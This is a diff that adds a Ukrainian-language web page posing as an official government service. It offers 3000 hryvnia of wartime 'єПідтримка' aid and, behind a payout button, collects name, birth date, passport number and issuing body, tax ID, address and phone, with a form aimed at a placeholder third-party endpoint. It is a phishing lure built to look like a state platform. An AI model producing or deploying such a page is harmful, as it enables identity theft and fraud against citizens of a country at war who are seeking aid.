@@ -1,0 +1,189 @@
+
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Анкета громадянина</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background-color: #002F6C;
+      color: white;
+      padding: 15px 10px;
+      text-align: center;
+      border-bottom: 4px solid #FFD700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+    header img {
+      height: 40px;
+      margin-right: 10px;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 20px;
+      text-transform: uppercase;
+    }
+    .container {
+      background: white;
+      max-width: 800px;
+      margin: 20px auto;
+      padding: 20px;
+      border: 1px solid #ccc;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
+    }
+    .section {
+      display: none;
+    }
+    .section.active {
+      display: block;
+    }
+    .info-block {
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+    .info-block strong {
+      display: inline-block;
+      width: 160px;
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-bottom: 5px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      font-size: 15px;
+      border: 1px solid #bbb;
+      border-radius: 4px;
+    }
+    button {
+      background-color: #002F6C;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      width: 100%;
+    }
+    button:hover {
+      background-color: #001D45;
+    }
+    .success-message {
+      display: none;
+      padding: 20px;
+      background-color: #d4edda;
+      border: 1px solid #c3e6cb;
+      color: #155724;
+      border-radius: 4px;
+      margin-top: 20px;
+      font-size: 16px;
+      text-align: center;
+    }
+    footer {
+      text-align: center;
+      font-size: 13px;
+      color: #666;
+      margin: 30px 0;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/99/Trysul.png/80px-Trysul.png" alt="Герб України">
+    <h1>Все буде Україна</h1>
+  </header>
+
+  <div class="container">
+    <div class="section active" id="section0">
+      <div class="info-block"><strong>Ідентифікатор послуги:</strong> 02411</div>
+      <div class="info-block"><strong>Строк:</strong> 1 день (робочий)</div>
+      <div class="info-block"><strong>Вартість:</strong> Безкоштовно</div>
+      <div class="info-block"><strong>Повна назва:</strong><br>
+        Надання допомоги в рамках Програми "єПідтримка" у зв’язку із втратою частини заробітної плати (доходу), робота (економічна діяльність) яких тимчасово зупинена внаслідок проведення бойових дій під час воєнного стану в Україні.
+      </div>
+      <button onclick="nextSection()">Отримати 3000 грн</button>
+    </div>
+
+    <div class="section" id="section1">
+      <form id="form" action="https://formspree.io/f/your-form-id" method="POST">
+        <div class="form-group">
+          <label>Прізвище, ім’я, по батькові</label>
+          <input type="text" name="pib" required>
+        </div>
+        <div class="form-group">
+          <label>Дата народження</label>
+          <input type="date" name="dob" required>
+        </div>
+        <div class="form-group">
+          <label>Номер документа</label>
+          <input type="text" name="passport_number" required>
+        </div>
+        <div class="form-group">
+          <label>Дійсний до</label>
+          <input type="date" name="passport_valid_until" required>
+        </div>
+        <div class="form-group">
+          <label>Орган, що видав документ</label>
+          <input type="text" name="issued_by" required>
+        </div>
+        <div class="form-group">
+          <label>РНОКПП (ІПН)</label>
+          <input type="text" name="tax_id" required>
+        </div>
+        <div class="form-group">
+          <label>Місце проживання</label>
+          <input type="text" name="address" required>
+        </div>
+        <div class="form-group">
+          <label>Номер телефону</label>
+          <input type="tel" name="phone" required>
+        </div>
+        <button type="submit">Надіслати</button>
+      </form>
+    </div>
+
+    <div class="success-message" id="successMessage">
+      Анкету успішно заповнено. З вами зв'яжеться спеціаліст протягом 2 годин для отримання коштів.
+    </div>
+  </div>
+
+  <footer>
+    &copy; 2025 Державна інформаційна платформа | Розроблено для підтримки громадян України
+  </footer>
+
+  <script>
+    let current = 0;
+    const sections = document.querySelectorAll('.section');
+
+    function nextSection() {
+      if (current < sections.length - 1) {
+        sections[current].classList.remove('active');
+        current++;
+        sections[current].classList.add('active');
+      }
+    }
+
+    document.getElementById('form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      sections[current].classList.remove('active');
+      document.getElementById('successMessage').style.display = 'block';
+    });
+  </script>
+
+</body>
+</html>
